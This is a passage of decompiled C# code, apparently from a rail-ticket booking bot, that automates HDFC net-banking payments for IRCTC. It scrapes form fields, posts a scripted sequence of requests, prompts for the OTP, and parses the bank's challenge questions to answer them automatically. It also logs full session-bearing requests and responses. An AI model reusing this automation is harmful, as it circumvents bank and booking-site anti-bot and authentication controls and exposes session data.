                                        text5 = "fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=" + text20 + "&fldRequestId=" + text21 + "&fldMsgSentMode=M&fldMobile=on&fldExtSessionId=" + text26 + "&fldBrnName=" + HttpUtility.UrlEncode(text24) + "&fldDevicePrint=" + HttpUtility.UrlEncode(str4) + "&urlChallanDtl=&fldBrnList=" + HttpUtility.UrlEncode(text24) + "%7E%3A%3A%7E&fldCodOrgBrn=&fldAccountMapFlag=N&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldLoginUserGroupType=N&fldIdChannel=1&fldCcyList=INR%7E%3A%3A%7E&fldMerchCode=" + text6 + "&fldTxnAmt=" + text11 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldTxnLimitFlag=N&fldTxnCurr=INR&fldRemoteAddress=" + text27 + "&fldLoginUserGroupBaseType=E&fldMerchName=" + text25 + "&fldClientCode=" + text8 + "&fldAdditionalFields=&fldMerchRefNo=" + text9 + "&fldRsaAuthReq=Y&fldProxyUserFlag=N&fldTxnScAmt=" + text12 + "&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldRsaTxnType=&fldBalList=" + text23 + "%7E%3A%3A%7E&fldPinRequired=Y&fldPin=Y&fldPinSequence=1&fldRsaAuthRetry=&fldRsaAuthTxnId=" + text28 + "&fldRsaAuthAction=OTPRELAY&fldOOBPhoneToken=&fldOOBPhoneRequest=&fldRsaQAAuthAvailable=N&fldRsaOOBPhoneAvailable=N&fldRsaSessionId=&fldRsaOTPAvailable=Y&fldOOBPhoneCountry=&fldOOBPhoneArea=&fldOOBPhoneNumber=&fldOOBPhoneExtn=&fldOOBPhoneLabel=&fldOOBPhoneCountryList=&fldOOBPhoneAreaList=&fldOOBPhoneNumberList=&fldOOBPhoneExtnList=&fldOOBPhoneLabelList=";
                                        if (!string.IsNullOrEmpty(value))
                                        {
                                            string_94 = string_94.Substring(string_94.IndexOf("var l_rsaTxnId\t= ") + 17);
                                            string string_96 = string_94.Substring(1, string_94.IndexOf("\";") - 1);
                                            string string_97 = string_94.Substring(string_94.IndexOf("</form>") + 8);
                                            text5 = class3_0.Method_SerialInp(string_97, ref string_92, false);
                                            string_92 = "https://netbanking.hdfcbank.com/netbanking/epientry";
                                            text5 = clsPostData.SetPost(text5, "fldRsaAuthTxnId", string_96);
                                            text5 = clsPostData.SetPost(text5, "fldRsaAuthAction", "OTPRELAY");
                                            text5 = clsPostData.SetPost(text5, "fldScrnSeqNbr", "06");
                                            text5 = clsPostData.SetPost(text5, "fldRsaAuthAction", "QUESTION");
                                            text5 = clsPostData.SetPost(text5, "fldOOBPhoneRequest", "N");
                                            string[] array3 = string_94.Substring(string_94.IndexOf("[qnt_count]") + 11).Split(new string[1] { "=" }, StringSplitOptions.None);
                                            string text29 = array3[1].Substring(0, array3[1].IndexOf("';")).Replace(" '", "");
                                            string text30 = array3[2].Substring(2, array3[2].IndexOf("\";") - 2).Replace("\";\r", "");
                                            string text31 = text30;
                                            int startIndex2 = text31.IndexOf("(") + 1;
                                            num2 = text31.IndexOf(",", startIndex2);
                                            if (num2 < 0)
                                            {
                                                num2 = text31.IndexOf("/", startIndex2);
                                            }
                                            startIndex2 = text31.LastIndexOf(" ", num2);
                                            num2 -= startIndex2;
                                            text31 = text31.Substring(startIndex2, num2).Trim();
                                            string text32 = text31;
                                            string text33 = array3[3].Substring(0, array3[3].IndexOf("';")).Replace(" '", "");
                                            string text34 = array3[4].Substring(2, array3[4].IndexOf("\";") - 2).Replace("\";\r", "");
                                            text31 = text34;
                                            startIndex2 = text31.IndexOf("(") + 1;
                                            num2 = text31.IndexOf(",", startIndex2);
                                            if (num2 < 0)
                                            {
                                                num2 = text31.IndexOf("/", startIndex2);
                                            }
                                            startIndex2 = text31.LastIndexOf(" ", num2);
                                            num2 -= startIndex2;
                                            text31 = text31.Substring(startIndex2, num2).Trim();
                                            string text35 = text31;
                                            string text36 = "&fldQuestionId=" + text29 + "&fldQuestionText=" + HttpUtility.UrlEncode(text30) + "&fldAnswer=" + text32 + "&fldQuestionId=" + text33 + "&fldQuestionText=" + HttpUtility.UrlEncode(text34) + "&fldAnswer=" + text35;
                                            text5 = clsPostData.SetPost(text5, "fldQuestionId", "00");
                                            text5 = clsPostData.SetPost(text5, "fldQuestionText", "00");
                                            text5 = clsPostData.SetPost(text5, "fldAnswer", "00");
                                            text5 = text5.Replace("&fldQuestionId=00", "").Replace("&fldQuestionText=00", "").Replace("&fldAnswer=00", "");
                                            text5 = clsPostData.SetPost(text5, "fldQuestionId", "00");
                                            text5 = clsPostData.SetPost(text5, "fldQuestionText", "00");
                                            text5 = clsPostData.SetPost(text5, "fldAnswer", "00");
                                            text5 = text5.Replace("&fldQuestionId=00", "").Replace("&fldQuestionText=00", "").Replace("&fldAnswer=00", "");
                                            text5 += text36;
                                            text5 = clsPostData.SetPost(text5, "fldMerchName", text25);
                                        }
                                        clsMain.Lock("Sixth Hit : Inp = " + text5);
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(6/8)", tCntrlName_, null, null);
                                        }
                                        if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                        {
                                            clsMain.Lock("Sixth Hit Failed. err = " + string_93);
                                            string_90 = "Failed while making Payment. Payment Not Done";
                                            break;
                                        }
                                        clsMain.Lock("Sixth Hit Output = " + string_94);
                                        if (string_94.Contains("payments.payu.in"))
                                        {
                                            string_89 = string_94;
                                            string_90 = string_92;
                                            return true;
                                        }
                                        if (string_94.Contains("<body onload=\"return logout()"))
                                        {
                                            List<string> list = new List<string>(string_94.Split(new string[1] { "<input" }, StringSplitOptions.None));
                                            list.RemoveAll((string string_0) => !string_0.ToLower().Contains("fldrequestid") && !string_0.ToLower().Contains("fldsessionid") && !string_0.ToLower().Contains("redirecturl"));
                                            string text37 = string.Empty;
                                            string text38 = string.Empty;
                                            string text39 = string.Empty;
                                            foreach (string item in list)
                                            {
                                                if (item.ToLower().Contains("fldsessionid"))
                                                {
                                                    text38 = item.Trim().Split(' ')[0].Split('=')[1].Trim('"');
                                                }
                                                if (item.ToLower().Contains("fldrequestid"))
                                                {
                                                    text37 = item.Trim().Split(' ')[0].Split('=')[1].Trim('"');
                                                }
                                                if (item.ToLower().Contains("redirecturl"))
                                                {
                                                    text39 = item.Trim().Substring(6, item.IndexOf("name") - 8).Replace("\"", "");
                                                    text39 = text39.Replace("&amp;", "%26").Replace("=", "%3D").Replace("?", "%3f");
                                                }
                                            }
                                            text5 = "fldAppId=XT&fldTxnId=LGF&fldScrnSeqNbr=01&fldSessionId=" + text38 + "&fldRequestId=" + text37 + "&fldAppId=XT&fldTxnId=LGF&fldScrnSeqNbr=01&fldSessionId=" + text38 + "&fldRequestId=" + text37 + "&REDIRECTURL=" + text39 + "&method=P&methodtype=";
                                        }
                                        else
                                        {
                                            if (string_94.Contains("document.forms[0].submit();"))
                                            {
                                                string_89 = string_94;
                                                string_90 = string_92;
                                                return true;
                                            }
                                            if (!string_94.Contains("One Time Password "))
                                            {
                                                string_90 = "Failed while Processing into HDFC after Login";
                                                clsMain.Lock("Fifth Hit Failed, Not valid HTML err = " + string_90);
                                                break;
                                            }
                                            startIndex = string_94.IndexOf("name=\"fldRequestId");
                                            startIndex = string_94.LastIndexOf("<", startIndex);
                                            startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                                            text21 = string_94.Substring(startIndex, length).Trim();
                                            startIndex = string_94.IndexOf("name=\"fldRemoteAddress");
                                            startIndex = string_94.LastIndexOf("<", startIndex);
                                            startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                                            text27 = string_94.Substring(startIndex, length).Trim();
                                            string string_98 = "123456";
                                            if (!method_163("Enter HDFC OTP For Branch Name:." + text24, ref string_98, ref string_90))
                                            {
                                                return false;
                                            }
                                            text5 = "fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=" + text20 + "&fldRequestId=" + text21 + "&fldOtpToken=" + string_98 + "&fldTxnCurr=INR&fldMobile=on&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldBrnList=" + HttpUtility.UrlEncode(text24) + "%7E%3A%3A%7E&urlChallanDtl=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldTxnScAmt=" + text12 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldExtSessionId=" + text26 + "&fldAdditionalFields=&fldCodOrgBrn=&fldBalList=" + text23 + "%7E%3A%3A%7E&fldRsaSessionId=&fldMerchName=" + text25 + "&fldRsaTxnType=&fldTxnAmt=" + text11 + "&fldRemoteAddress=" + text27 + "&fldMerchCode=" + text6 + "&fldMerchRefNo=" + text9 + "&fldCcyList=INR%7E%3A%3A%7E&fldRsaOTPAvailable=Y&fldRsaAuthReq=Y&fldClientCode=" + text8 + "&fldBrnName=" + HttpUtility.UrlEncode(text24) + "&fldOOBPhoneExtn=&fldMsgSentMode=M&fldPinRequired=Y&fldPin=Y&fldPinSequence=1&fldRsaAuthRetry=&fldRsaAuthTxnId=" + text28 + "&fldRsaAuthAction=OTP&fldOOBPhoneToken=&fldOOBPhoneRequest=&fldRsaQAAuthAvailable=N&fldRsaOOBPhoneAvailable=N&fldRsaSessionId=" + text26 + "&fldRsaOTPAvailable=Y&fldOOBPhoneCountry=&fldOOBPhoneArea=&fldOOBPhoneNumber=&fldOOBPhoneExtn=&fldOOBPhoneLabel=&fldOOBPhoneCountryList=&fldOOBPhoneAreaList=&fldOOBPhoneNumberList=&fldOOBPhoneExtnList=&fldOOBPhoneLabelList=";
                                            clsMain.Lock("Seventh Hit : Inp = " + text5);
                                            if (updateTStatus_1 != null)
                                            {
                                                updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(7/8)", tCntrlName_, null, null);
                                            }
                                            if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                            {
                                                clsMain.Lock("Seventh Hit Failed. err = " + string_93);
                                                string_90 = "Failed while making Payment. Payment Not Done";
                                                break;
                                            }
                                            clsMain.Lock("Seventh Hit Output = " + string_94);
                                            string string_99 = "";
                                            text5 = class3_0.Method_SerialInp(string_94, ref string_99, true);
                                            if (!string_94.Contains("https://www.irctc.co.in/eticketing/BankResponse?ClientCode"))
                                            {
                                                string_90 = "Failed while Processing into HDFC, Ticket Not Booked";
                                                clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_90);
                                                break;
                                            }
                                        }
                                        clsMain.Lock("Eigth Hit Inp = " + text5);
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(8/8)", tCntrlName_, null, null);
                                        }
                                        if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                                        {
                                            clsMain.Lock("Eigth Hit Failed. err = " + string_93);
                                            string_90 = "Failed while making Payment at HDFC. Ticket Not Booked";
                                            break;
                                        }
                                        clsMain.Lock("Eigth Hit output = " + string_94);
                                        if (string_94.Contains("document.frmredirect.submit"))
                                        {
                                            string_89 = string_94;
                                            string_90 = string_92;
                                            return true;
                                        }
                                        string_90 = "Failed while Processing into HDFC, Ticket Not Booked";
                                        clsMain.Lock("Eigth Hit Failed, Not valid HTML err = " + string_90);
                                        break;
                                    }
                                    clsMain.Lock("Third Hit Failed. err = " + string_93);
                                    string_90 = "Failed while making Payment. Payment Not Done";
                                    break;
                                }
                                clsMain.Lock("Second Hit Failed. err = " + string_93);
                                string_90 = "Failed while making Payment. Payment Not Done";
                                break;
                            }
                            return result;
                        }
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "HDFC Not Working - Payment Failed";
                        break;
                    }
                    clsMain.Lock("First Hit Failed. err = " + string_93);
                    string_90 = "HDFC Not Working - Payment Failed";
                    text5 = "fldAppId=RS&fldTxnId=LGF&fldScrnSeqNbr=01&fldModule=CH&fldSessionId=" + text3 + "&fldRequestId=" + text4 + "&fldTxnRequest=";
                    clsMain.Lock("Seventh Hit : Inp = " + text5);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(0/8)", tCntrlName_, null, null);
                    }
                    _Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0);
                    result2 = false;
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessHDFCNetBanking", ex.Message);
                    result2 = false;
                }
                return result2;
            }
            string_90 = "Some thing went wrong with HDFC Payment";
            clsMain.Lock("Html doesn't contains hdfcbank, returning.");
            return false;
        }

        internal bool method_114(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            int num = 90000;
            int num2 = 0;
            clsMain.Lock("Enter ProcessHDFCNetBanking.");
            if (string_86.Contains("hdfcbank"))
            {
                string_89 = "";
                string string_91 = "https://www.irctc.co.in/eticketing/jpInput.jsf?cid=1";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string text3 = "";
                if (array.Length > 2)
                {
                    text3 = array[2];
                }
                string string_92 = "";
                string string_93 = "";
                string string_94 = "";
                string text4 = "";
                string text5 = "";
                DateTime now = DateTime.Now;
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                bool result2;
                try
                {
                    num2++;
                    clsMain.Lock("First Hit : Inp = " + text6);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(1/7)", tCntrlName_, null, null);
                    }
                    if (_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Output htm = " + string_94);
                        if (string.IsNullOrEmpty(string_94.Trim()) || !string_94.Contains("HDFC Bank Direct Pay"))
                        {
                            return result;
                        }
                        int startIndex = string_94.IndexOf("MerchantCode") + 5;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text7 = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("EpiReqId", startIndex) + 5;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text8 = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("ClientCode", startIndex) + 5;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text9 = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("MerchantRefNo", startIndex) + 7;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text10 = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("TxnDateTime", startIndex) + 7;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text11 = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("OrgReqDate", startIndex) + 7;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string str = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("TxnAmount", startIndex) + 7;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text12 = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("TxnScAmount", startIndex) + 7;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text13 = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("DynamicUrl", startIndex) + 7;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string str2 = string_94.Substring(startIndex, length);
                        startIndex = string_94.IndexOf("CheckSum", startIndex) + 7;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text14 = string_94.Substring(startIndex, length);
                        string str3 = "*" + text8 + "*" + text7 + "*" + text9 + "*" + text10 + "*" + text11 + "******";
                        string string_95 = Math.Ceiling(10000000.0 + (double)new Random().Next(90000001)).ToString();
                        string text15 = text2.ToUpper().Substring(2, text2.Length - 2);
                        while (text15.Length < 32)
                        {
                            text15 += "0";
                        }
                        string text16 = method_5(text15, ref string_95);
                        string text17 = "<html>\n<head>\n<script type=\"text/javascript\">\n\t/*-----------------------------------------------------------------------------\n\tThis source is part of the FLEXCUBE@ Java App Server Software System and is\n\tcopyrighted by i-flex Solutions Limited.\n\tAll rights reserved. No part of this work may be reproduced, stored in a\n\tretrieval system, adopted or transmitted in any form or by any means,\n\telectronic, mechanical, photographic, graphic, optic recording or otherwise,\n\ttranslated in any language or computer language, without the prior written\n\tpermission of i-flex Solutions Limited.\n\ti-flex Solutions Limited.\n\t10-11, SDF I, SEEPZ, Andheri (East),\n\tMumbai - 400 096.\n\tIndia\n\tCopyright 2004 i-flex Solutions Limited.\n\tModification History\n\tDate Version Author Description\n\t__________ ___________ _______________ ________________________________________\n\t22/11/2012 1.0 Sandeep Saxena Des algo\n\t------------------------------------------------------------------------------*/\n\t//des\n\t//this takes the key, the message, and whether to encrypt or decrypt\n\tfunction des (key, message, encrypt, mode, iv, padding) {\n\t//declaring this locally speeds things up a bit\n\tvar spfunction1 = new Array (0x1010400,0,0x10000,0x1010404,0x1010004,0x10404,0x4,0x10000,0x400,0x1010400,0x1010404,0x400,0x1000404,0x1010004,0x1000000,0x4,0x404,0x1000400,0x1000400,0x10400,0x10400,0x1010000,0x1010000,0x1000404,0x10004,0x1000004,0x1000004,0x10004,0,0x404,0x10404,0x1000000,0x10000,0x1010404,0x4,0x1010000,0x1010400,0x1000000,0x1000000,0x400,0x1010004,0x10000,0x10400,0x1000004,0x400,0x4,0x1000404,0x10404,0x1010404,0x10004,0x1010000,0x1000404,0x1000004,0x404,0x10404,0x1010400,0x404,0x1000400,0x1000400,0,0x10004,0x10400,0,0x1010004);\n\tvar spfunction2 = new Array (-0x7fef7fe0,-0x7fff8000,0x8000,0x108020,0x100000,0x20,-0x7fefffe0,-0x7fff7fe0,-0x7fffffe0,-0x7fef7fe0,-0x7fef8000,-0x80000000,-0x7fff8000,0x100000,0x20,-0x7fefffe0,0x108000,0x100020,-0x7fff7fe0,0,-0x80000000,0x8000,0x108020,-0x7ff00000,0x100020,-0x7fffffe0,0,0x108000,0x8020,-0x7fef8000,-0x7ff00000,0x8020,0,0x108020,-0x7fefffe0,0x100000,-0x7fff7fe0,-0x7ff00000,-0x7fef8000,0x8000,-0x7ff00000,-0x7fff8000,0x20,-0x7fef7fe0,0x108020,0x20,0x8000,-0x80000000,0x8020,-0x7fef8000,0x100000,-0x7fffffe0,0x100020,-0x7fff7fe0,-0x7fffffe0,0x100020,0x108000,0,-0x7fff8000,0x8020,-0x80000000,-0x7fefffe0,-0x7fef7fe0,0x108000);\n\tvar spfunction3 = new Array (0x208,0x8020200,0,0x8020008,0x8000200,0,0x20208,0x8000200,0x20008,0x8000008,0x8000008,0x20000,0x8020208,0x20008,0x8020000,0x208,0x8000000,0x8,0x8020200,0x200,0x20200,0x8020000,0x8020008,0x20208,0x8000208,0x20200,0x20000,0x8000208,0x8,0x8020208,0x200,0x8000000,0x8020200,0x8000000,0x20008,0x208,0x20000,0x8020200,0x8000200,0,0x200,0x20008,0x8020208,0x8000200,0x8000008,0x200,0,0x8020008,0x8000208,0x20000,0x8000000,0x8020208,0x8,0x20208,0x20200,0x8000008,0x8020000,0x8000208,0x208,0x8020000,0x20208,0x8,0x8020008,0x20200);\n\tvar spfunction4 = new Array (0x802001,0x2081,0x2081,0x80,0x802080,0x800081,0x800001,0x2001,0,0x802000,0x802000,0x802081,0x81,0,0x800080,0x800001,0x1,0x2000,0x800000,0x802001,0x80,0x800000,0x2001,0x2080,0x800081,0x1,0x2080,0x800080,0x2000,0x802080,0x802081,0x81,0x800080,0x800001,0x802000,0x802081,0x81,0,0,0x802000,0x2080,0x800080,0x800081,0x1,0x802001,0x2081,0x2081,0x80,0x802081,0x81,0x1,0x2000,0x800001,0x2001,0x802080,0x800081,0x2001,0x2080,0x800000,0x802001,0x80,0x800000,0x2000,0x802080);\n\tvar spfunction5 = new Array (0x100,0x2080100,0x2080000,0x42000100,0x80000,0x100,0x40000000,0x2080000,0x40080100,0x80000,0x2000100,0x40080100,0x42000100,0x42080000,0x80100,0x40000000,0x2000000,0x40080000,0x40080000,0,0x40000100,0x42080100,0x42080100,0x2000100,0x42080000,0x40000100,0,0x42000000,0x2080100,0x2000000,0x42000000,0x80100,0x80000,0x42000100,0x100,0x2000000,0x40000000,0x2080000,0x42000100,0x40080100,0x2000100,0x40000000,0x42080000,0x2080100,0x40080100,0x100,0x2000000,0x42080000,0x42080100,0x80100,0x42000000,0x42080100,0x2080000,0,0x40080000,0x42000000,0x80100,0x2000100,0x40000100,0x80000,0,0x40080000,0x2080100,0x40000100);\n\tvar spfunction6 = new Array (0x20000010,0x20400000,0x4000,0x20404010,0x20400000,0x10,0x20404010,0x400000,0x20004000,0x404010,0x400000,0x20000010,0x400010,0x20004000,0x20000000,0x4010,0,0x400010,0x20004010,0x4000,0x404000,0x20004010,0x10,0x20400010,0x20400010,0,0x404010,0x20404000,0x4010,0x404000,0x20404000,0x20000000,0x20004000,0x10,0x20400010,0x404000,0x20404010,0x400000,0x4010,0x20000010,0x400000,0x20004000,0x20000000,0x4010,0x20000010,0x20404010,0x404000,0x20400000,0x404010,0x20404000,0,0x20400010,0x10,0x4000,0x20400000,0x404010,0x4000,0x400010,0x20004010,0,0x20404000,0x20000000,0x400010,0x20004010);\n\tvar spfunction7 = new Array (0x200000,0x4200002,0x4000802,0,0x800,0x4000802,0x200802,0x4200800,0x4200802,0x200000,0,0x4000002,0x2,0x4000000,0x4200002,0x802,0x4000800,0x200802,0x200002,0x4000800,0x4000002,0x4200000,0x4200800,0x200002,0x4200000,0x800,0x802,0x4200802,0x200800,0x2,0x4000000,0x200800,0x4000000,0x200800,0x200000,0x4000802,0x4000802,0x4200002,0x4200002,0x2,0x200002,0x4000000,0x4000800,0x200000,0x4200800,0x802,0x200802,0x4200800,0x802,0x4000002,0x4200802,0x4200000,0x200800,0,0x2,0x4200802,0,0x200802,0x4200000,0x800,0x4000002,0x4000800,0x800,0x200002);\n\tvar spfunction8 = new Array (0x10001040,0x1000,0x40000,0x10041040,0x10000000,0x10001040,0x40,0x10000000,0x40040,0x10040000,0x10041040,0x41000,0x10041000,0x41040,0x1000,0x40,0x10040000,0x10000040,0x10001000,0x1040,0x41000,0x40040,0x10040040,0x10041000,0x1040,0,0,0x10040040,0x10000040,0x10001000,0x41040,0x40000,0x41040,0x40000,0x10041000,0x1000,0x40,0x10040040,0x1000,0x41040,0x10001000,0x40,0x10000040,0x10040000,0x10040040,0x10000000,0x40000,0x10001040,0,0x10041040,0x40040,0x10000040,0x10040000,0x10001000,0x10001040,0,0x10041040,0x41000,0x41000,0x1040,0x1040,0x40040,0x10000000,0x10041000);\n\t//create the 16 or 48 subkeys we will need\n\tvar keys = des_createKeys (key);\n\tvar m=0, i, j, temp, temp2, right1, right2, left, right, looping;\n\tvar cbcleft, cbcleft2, cbcright, cbcright2\n\tvar endloop, loopinc;\n\tvar len = message.length;\n\tvar chunk = 0;\n\t//set up the loops for single and triple des\n\tvar iterations = keys.length == 32 ? 3 : 9; //single or triple des\n\tif (iterations == 3) {looping = encrypt ? new Array (0, 32, 2) : new Array (30, -2, -2);}\n\telse {looping = encrypt ? new Array (0, 32, 2, 62, 30, -2, 64, 96, 2) : new Array (94, 62, -2, 32, 64, 2, 30, -2, -2);}\n\t//pad the message depending on the padding parameter\n\tif (padding == 2) message += \" \"; //pad the message with spaces\n\telse if (padding == 1) {temp = 8-(len%8); message += String.fromCharCode (temp,temp,temp,temp,temp,temp,temp,temp); if (temp==8) len+=8;} //PKCS7 padding\n\telse if (!padding) message += \"\\0\\0\\0\\0\\0\\0\\0\\0\"; //pad the message out with null bytes\n\t//store the result here\n\tresult = \"\";\n\ttempresult = \"\";\n\tif (mode == 1) { //CBC mode\n\tcbcleft = (iv.charCodeAt(m++) << 24) | (iv.charCodeAt(m++) << 16) | (iv.charCodeAt(m++) << 8) | iv.charCodeAt(m++);\n\tcbcright = (iv.charCodeAt(m++) << 24) | (iv.charCodeAt(m++) << 16) | (iv.charCodeAt(m++) << 8) | iv.charCodeAt(m++);\n\tm=0;\n\t}\n\t//loop through each 64 bit chunk of the message\n\twhile (m < len) {\n\tleft = (message.charCodeAt(m++) << 24) | (message.charCodeAt(m++) << 16) | (message.charCodeAt(m++) << 8) | message.charCodeAt(m++);\n\tright = (message.charCodeAt(m++) << 24) | (message.charCodeAt(m++) << 16) | (message.charCodeAt(m++) << 8) | message.charCodeAt(m++);\n\t//for Cipher Block Chaining mode, xor the message with the previous result\n\tif (mode == 1) {if (encrypt) {left ^= cbcleft; right ^= cbcright;} else {cbcleft2 = cbcleft; cbcright2 = cbcright; cbcleft = left; cbcright = right;}}\n\t//first each 64 but chunk of the message must be permuted according to IP\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\ttemp = ((left >>> 16) ^ right) & 0x0000ffff; right ^= temp; left ^= (temp << 16);\n\ttemp = ((right >>> 2) ^ left) & 0x33333333; left ^= temp; right ^= (temp << 2);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\tleft = ((left << 1) | (left >>> 31));\n\tright = ((right << 1) | (right >>> 31));\n\t//do this either 1 or 3 times for each chunk of the message\n\tfor (j=0; j<iterations; j+=3) {\n\tendloop = looping[j+1];\n\tloopinc = looping[j+2];\n\t//now go through and perform the encryption or decryption\n\tfor (i=looping[j]; i!=endloop; i+=loopinc) { //for efficiency\n\tright1 = right ^ keys[i];\n\tright2 = ((right >>> 4) | (right << 28)) ^ keys[i+1];\n\t//the result is attained by passing these bytes through the S selection functions\n\ttemp = left;\n\tleft = right;\n\tright = temp ^ (spfunction2[(right1 >>> 24) & 0x3f] | spfunction4[(right1 >>> 16) & 0x3f]\n\t| spfunction6[(right1 >>> 8) & 0x3f] | spfunction8[right1 & 0x3f]\n\t| spfunction1[(right2 >>> 24) & 0x3f] | spfunction3[(right2 >>> 16) & 0x3f]\n\t| spfunction5[(right2 >>> 8) & 0x3f] | spfunction7[right2 & 0x3f]);\n\t}\n\ttemp = left; left = right; right = temp; //unreverse left and right\n\t} //for either 1 or 3 iterations\n\t//move then each one bit to the right\n\tleft = ((left >>> 1) | (left << 31));\n\tright = ((right >>> 1) | (right << 31));\n\t//now perform IP-1, which is IP in the opposite direction\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((right >>> 2) ^ left) & 0x33333333; left ^= temp; right ^= (temp << 2);\n\ttemp = ((left >>> 16) ^ right) & 0x0000ffff; right ^= temp; left ^= (temp << 16);\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\t//for Cipher Block Chaining mode, xor the message with the previous result\n\tif (mode == 1) {if (encrypt) {cbcleft = left; cbcright = right;} else {left ^= cbcleft2; right ^= cbcright2;}}\n\ttempresult += String.fromCharCode ((left>>>24), ((left>>>16) & 0xff), ((left>>>8) & 0xff), (left & 0xff), (right>>>24), ((right>>>16) & 0xff), ((right>>>8) & 0xff), (right & 0xff));\n\tchunk += 8;\n\tif (chunk == 512) {result += tempresult; tempresult = \"\"; chunk = 0;}\n\t} //for every 8 characters, or 64 bits in the message\n\t//return the result as an array\n\treturn result + tempresult;\n\t} //end of des\n\t//des_createKeys\n\t//this takes as input a 64 bit key (even though only 56 bits are used)\n\t//as an array of 2 integers, and returns 16 48 bit keys\n\tfunction des_createKeys (key) {\n\t//declaring this locally speeds things up a bit\n\tpc2bytes0 = new Array (0,0x4,0x20000000,0x20000004,0x10000,0x10004,0x20010000,0x20010004,0x200,0x204,0x20000200,0x20000204,0x10200,0x10204,0x20010200,0x20010204);\n\tpc2bytes1 = new Array (0,0x1,0x100000,0x100001,0x4000000,0x4000001,0x4100000,0x4100001,0x100,0x101,0x100100,0x100101,0x4000100,0x4000101,0x4100100,0x4100101);\n\tpc2bytes2 = new Array (0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808,0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808);\n\tpc2bytes3 = new Array (0,0x200000,0x8000000,0x8200000,0x2000,0x202000,0x8002000,0x8202000,0x20000,0x220000,0x8020000,0x8220000,0x22000,0x222000,0x8022000,0x8222000);\n\tpc2bytes4 = new Array (0,0x40000,0x10,0x40010,0,0x40000,0x10,0x40010,0x1000,0x41000,0x1010,0x41010,0x1000,0x41000,0x1010,0x41010);\n\tpc2bytes5 = new Array 